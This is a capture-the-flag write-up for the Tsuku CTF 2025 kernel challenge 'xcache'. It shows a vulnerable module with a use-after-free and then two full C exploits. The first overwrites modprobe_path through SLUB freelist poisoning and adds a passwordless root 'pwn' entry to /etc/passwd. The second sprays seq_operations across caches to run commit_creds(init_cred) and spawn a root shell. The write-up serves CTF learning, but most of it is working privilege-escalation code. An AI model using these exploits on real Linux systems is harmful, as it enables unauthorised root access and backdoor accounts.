# xcache
<primary-label ref="pwn"/>

Tsuku CTF 2025

## challenge
```c
#define CMD_ALLOC   0xf000
#define CMD_WRITE   0xf001
#define CMD_FREE    0xf002

#define OBJ_MAX     0x200
#define OBJ_SIZE    0x200

typedef struct {
    int id;
    size_t size;
    char *data;
} request_t;

struct obj {
    char buf[OBJ_SIZE];
};

static struct obj *objs[OBJ_MAX];
static struct kmem_cache *obj_cachep;
static DEFINE_MUTEX(module_lock);

static long obj_alloc(int id) {
    if (objs[id] != NULL) {
        return -1;
    }
    objs[id] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);
    if (objs[id] == NULL) {
        return -1;
    }
    return 0;
}

static long obj_write(int id, char *data, size_t size) {
    if (objs[id] == NULL || size > OBJ_SIZE) {
        return -1;
    }
    if (copy_from_user(objs[id]->buf, data, size) != 0) {
        return -1;
    }
    return 0;
}

static long obj_free(int id) {
    kmem_cache_free(obj_cachep, objs[id]);
    return 0;
}

static long module_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    request_t req;
    long ret;
    if (copy_from_user(&req, (void *)arg, sizeof(req)) != 0) {
        return -1;
    }
    if (req.id < 0 || req.id > OBJ_MAX - 1) {
        return -1;
    }
    mutex_lock(&module_lock);
    switch(cmd) {
        case CMD_ALLOC:
            ret = obj_alloc(req.id);
            break;
        case CMD_WRITE:
            ret = obj_write(req.id, req.data, req.size);
            break;
        case CMD_FREE:
            ret = obj_free(req.id);
            break;
        default:
            ret = -1;
            break;
    }
    mutex_unlock(&module_lock);
    return ret;
}
```

## summary 1
This challenge is similar with [](easy-kernel.md).

Two things that difference from the previous challenge are allocator and buf size.
1. allocator
    * the buffers which store the users data were allocated by `kmem_cache`. `kmem_cache` has original cache method inside, so we have to cross the cache method.
2. buf size
    * pwner can allocate 0x200 bytes buffer for 0x200 times.

> Since `page_alloc.shuffle=1` mitigation was off, we can solve it without cross-cache.
> 
> ```sh
> #!/bin/sh
> qemu-system-x86_64 \
>     -m 64M \
>     -cpu qemu64 \
>     -kernel bzImage \
>     -drive file=rootfs.ext3,format=raw \
>     -drive file=flag.txt,format=raw \
>     -snapshot \
>     -nographic \
>     -monitor /dev/null \
>     -no-reboot \
>     -smp 1 \
>     -append "root=/dev/sda rw init=/init console=ttyS0 nokaslr nopti loglevel=7 oops=panic panic=-1"
> ```
> using `slub` poisoning to overwrite modprobe_path is possible in this challenge.
> but `modprobe_path` method with `search_binary_handler()` has been disabled after linux 6.14.pr1.
> according to this blog: [](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch), it's able to call `modprobe_path` as kernel permission even `modprobe_path` method has been disabled (there's another way to call modprobe_path).
> 
> Following the blog, I attempted to use the AF_ALG protocol with bind, but the CTF's QEMU environment didn't support the AF_ALG protocol. However, unintentionally, when I executed socket with `AF_ALG` as an unknown protocol, it triggered __request_module....xD
> [](https://elixir.bootlin.com/linux/v6.14.2/source/net/socket.c#L1528)
> 
> ![Screenshot_20250509_115745.png](Screenshot_20250509_115746.png)
> 
> {style=note}

## exploit 1

![Screenshot_20250509_113355.png](Screenshot_20250509_113355.png)

```c
#define _GNU_SOURCE

#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <poll.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

#define MODULE_NAME "/dev/vuln"
#define MODPROBE_SCRIPT "#!/bin/sh\necho pwn::0:0:root:/root:/bin/sh>>/etc/passwd\n"
#define PROC_NAME "NKTIDKSG"

#define MODPROBE_FAKE "/tmp/810114514"

#define COLOR_RESET "\033[0m"
#define COLOR_RED "\033[0;31m"
#define COLOR_GREEN "\033[0;32m"
#define COLOR_YELLOW "\033[0;33m"
#define COLOR_BLUE "\033[0;34m"
#define COLOR_MAGENTA "\033[0;35m"
#define COLOR_CYAN "\033[0;36m"

#define info(fmt, ...) \
    printf(COLOR_CYAN "[*] " fmt COLOR_RESET "\n", ##__VA_ARGS__)
#define success(fmt, ...) \
    printf(COLOR_GREEN "[+] " fmt COLOR_RESET "\n", ##__VA_ARGS__)
#define error(fmt, ...) \
    printf(COLOR_RED "[-] " fmt COLOR_RESET "\n", ##__VA_ARGS__)
#define warning(fmt, ...) \
    printf(COLOR_YELLOW "[!] " fmt COLOR_RESET "\n", ##__VA_ARGS__)

#define SYSCHK(x) ({ \
    typeof(x) __res = (x); \
    if (__res == (typeof(x))-1) { \
    fprintf(stderr, "%s: %s\n", "SYSCHK(" #x ")", strerror(errno)); \
    exit(1); \
    } \
    __res; \
    })

#define CMD_ALLOC 0xf000
#define CMD_WRITE 0xf001
#define CMD_FREE 0xf002

#define OBJ_MAX 0x200
#define OBJ_SIZE 0x200

#define MODULE_NAME "/dev/vuln"

typedef struct
{
    int id;
    size_t size;
    char *data;
} request_t;

unsigned long modprobe_path = 0xffffffff81eaeac0;

unsigned long objs = 0xffffffffc0002660;

int main(void)
{
    int exp_fd = SYSCHK(open(MODPROBE_FAKE, O_RDWR | O_CREAT, 0777));
    SYSCHK(write(exp_fd, MODPROBE_SCRIPT, strlen(MODPROBE_SCRIPT)));
    SYSCHK(close(exp_fd));

    int victim = open(MODULE_NAME, O_RDWR);
    if (victim < 0)
    {
        error("[-] open %s failed", MODULE_NAME);
        exit(1);
    }
    info("victim fd: %d", victim);

    request_t req = {.id = 0, .size = 0x0, .data = NULL};
    ioctl(victim, CMD_ALLOC, &req);
    ioctl(victim, CMD_FREE, &req);

    char payload[0x200] = {0};
    unsigned long *p = (unsigned long *)&payload[0x100];
    *p = objs+0x20;
    req.data = payload;
    req.size = sizeof(payload);
    ioctl(victim, CMD_WRITE, &req);
    req.id = 1;
    req.size = 0x0;
    req.data = NULL;
    ioctl(victim, CMD_ALLOC, &req);
    req.id = 2;
    ioctl(victim, CMD_ALLOC, &req);
    char p2[0x8] = {0};
    unsigned long *p2_ = (unsigned long *)&p2[0x0];
    *p2_ = modprobe_path;
    req.id = 2;
    req.data = p2;
    req.size = sizeof(p2);
    success("overwrite objs");
    ioctl(victim, CMD_WRITE, &req);

    req.id = 4;
    req.data = MODPROBE_FAKE;
    req.size = strlen(MODPROBE_FAKE);

    success("overwrite modprobe_path");
    ioctl(victim, CMD_WRITE, &req);

    info("socket"); 
    int inv_protocol = socket(38, SOCK_SEQPACKET, 0);

    system("su - pwn");
    system("/bin/sh");
    return 0;
}
```

## Summary 2
According to the title of this challenge, author intended us to exploit with cross-cache.

[](https://xz.aliyun.com/news/11863)

[](https://u1f383.github.io/linux/2025/01/03/cross-cache-attack-cheatsheet.html)


## exploit 2
```c
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

#define COLOR_RESET   "\033[0m"
#define COLOR_RED     "\033[0;31m"
#define COLOR_GREEN   "\033[0;32m"
#define COLOR_YELLOW  "\033[0;33m"
#define COLOR_BLUE    "\033[0;34m"
#define COLOR_MAGENTA "\033[0;35m"
#define COLOR_CYAN    "\033[0;36m"
#define PROC_NAME "NKTIDKSG"
#define MODPROBE_SCRIPT "#!/bin/sh\necho pwn::0:0:root:/root:/bin/sh>>/etc/passwd\n"
#define MODPROBE_FAKE "/tmp/810114514"
#define info(fmt, ...) \
    printf(COLOR_CYAN "[*] " fmt COLOR_RESET "\n", ##__VA_ARGS__)
#define success(fmt, ...) \
    printf(COLOR_GREEN "[+] " fmt COLOR_RESET "\n", ##__VA_ARGS__)
#define error(fmt, ...) \
    printf(COLOR_RED "[-] " fmt COLOR_RESET "\n", ##__VA_ARGS__)
#define warning(fmt, ...) \
    printf(COLOR_YELLOW "[!] " fmt COLOR_RESET "\n", ##__VA_ARGS__)
#define SYSCHK(x) ({ \
    typeof(x) __res = (x); \
    if (__res == (typeof(x))-1) { \
    fprintf(stderr, "%s: %s\n", "SYSCHK(" #x ")", strerror(errno)); \
    exit(1); \
    } \
    __res; \
    })

#define CMD_ALLOC   0xf000
#define CMD_WRITE   0xf001
#define CMD_FREE    0xf002

#define OBJ_MAX     0x200
#define OBJ_SIZE    0x200
#define MODULE_NAME "/dev/vuln"

#define SPRAY 0x100

typedef struct {
    int id;
    size_t size;
    char *data;
} request_t;

unsigned long cs;
unsigned long ss;
unsigned long rsp;
unsigned long rflags;

unsigned long commit_creds = 0xffffffff812a1050;
unsigned long init_cred = 0xffffffff81e3bfa0;
unsigned long modprobe_path = 0xffffffff81eaeac0;
unsigned long kbase = 0xffffffff81000000;
// /sys/kernel/slab/kmalloc-512/objs_per_slab , cpu_partial
unsigned int ops512 = 8;
unsigned int cp512 = 52;

void shell() {
    puts("[*] shell");
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
}

static void ret2user(unsigned long rip) {
    asm volatile ("swapgs\n");
    asm volatile(
        "movq %0, 0x20(%%rsp)\t\n"
        "movq %1, 0x18(%%rsp)\t\n"
        "movq %2, 0x10(%%rsp)\t\n"
        "movq %3, 0x08(%%rsp)\t\n"
        "movq %4, 0x00(%%rsp)\t\n"
        "iretq"
        :
        : "r"(ss),
          "r"(rsp),
          "r"(rflags),
          "r"(cs), "r"(rip));
}

void lpe() {
    void (*cc)(char *) = (void *)commit_creds;
    (*cc)((void *)init_cred);
    ret2user((unsigned long)shell);
}

static void refuge() {
    asm volatile (
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(cs), "=r"(ss), "=r"(rsp), "=r"(rflags)
        :
        : "memory");
}

int main(void) {
    int victim = open(MODULE_NAME, O_RDWR);
    if (victim < 0) {
        error("[-] open %s failed", MODULE_NAME);
        exit(1);
    }
    info("victim fd: %d", victim);

    request_t req = {.id = 0, .size = 0x0, .data = NULL};
    info("spray1. cpu_partial slab");
    for (int i = 0;i < ops512*(cp512+1);i++) {
        req.id = i;
        ioctl(victim,CMD_ALLOC, &req);
    }
    req.id = ops512*(cp512+1);
    ioctl(victim,CMD_ALLOC, &req);

    info("free");
    for (int i = 0;i < ops512*(cp512+1);i+=ops512) {
        if  (i % (ops512*2) == 0) {
            for (int j = 0;j < ops512;j++) {
                req.id = i+j;
                ioctl(victim,CMD_FREE, &req);
            }
        } else {
            req.id = i;
            ioctl(victim,CMD_FREE, &req);
        }
    }

    info("spray seq_operations");
    int seqs[SPRAY] = {0};
    for (int i = 0;i < SPRAY;i++) {
        seqs[i] = open("/proc/self/stat", O_RDONLY);
    }

    char payload[0x20] = {0};
    unsigned long *p = (unsigned long *)payload;
    *p++ = (unsigned long)lpe;
    *p++ = (unsigned long)lpe;
    *p++ = (unsigned long)lpe;
    *p++ = (unsigned long)lpe;

    req.data = payload;
    req.size = sizeof(payload);
    info("injecting seq_operations");
    for (int i = 0;i < ops512*(cp512+1);i+=ops512) {
        if  (i % (ops512*2) == 0) {
            req.id = i;
            ioctl(victim,CMD_WRITE, &req);
        }
    }

    info("trying to get rip");
    for (int i = 0;i < SPRAY;i++) {
        refuge();        
        read(seqs[i], NULL, 1);
    }
}
```